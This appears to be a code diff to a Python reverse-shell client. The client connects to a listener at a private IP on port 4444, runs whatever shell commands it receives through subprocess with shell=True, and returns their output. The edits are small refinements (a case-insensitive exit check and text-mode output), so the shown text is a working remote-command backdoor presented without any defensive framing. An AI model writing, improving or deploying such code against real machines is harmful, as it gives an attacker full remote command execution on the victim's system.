@@ -27,15 +27,14 @@ class Client:
     def execute_commands(self):
         while True:
             command = self.reliable_receive()  # Receive command from listener
-            if command == 'exit':
+            if command.lower() == 'exit':
                 break  # Exit if 'exit' command received
             # Execute the command and capture the output
-            output = subprocess.run(command, shell=True, capture_output=True)
-            self.reliable_send(output.stdout.decode() + output.stderr.decode())  # Send back the output
+            output = subprocess.run(command, shell=True, capture_output=True, text=True)
+            self.reliable_send(output.stdout + output.stderr)  # Send back the output
 
         self.connection.close()  # Close the connection
 
 # Replace with your listener's IP and port
-my_client = Client("10.0.2.4", 4444)
+my_client = Client("10.0.2.4", 4444)  # Update with the correct IP
 my_client.execute_commands()
-
